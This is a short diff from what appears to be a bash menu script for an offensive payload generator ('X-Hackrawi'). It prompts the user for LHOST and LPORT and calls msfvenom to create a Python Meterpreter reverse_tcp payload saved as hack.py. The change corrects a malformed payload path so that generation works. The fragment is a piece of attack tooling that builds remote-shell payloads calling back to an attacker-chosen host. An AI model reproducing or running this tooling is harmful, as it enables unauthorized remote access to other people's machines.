@@ -96,7 +96,7 @@ echo -e $red " Please Insert LHOST :>"
 read -p "insert LHOST :> " lhost
 echo -e $red " Please Insert LPORT :>"
 read -p "insert LPORT :> " lport
-msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o hack.py
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o hack.py
 bash X-Hackrawi.sh
 fi
 if [ $payload = 3 ]
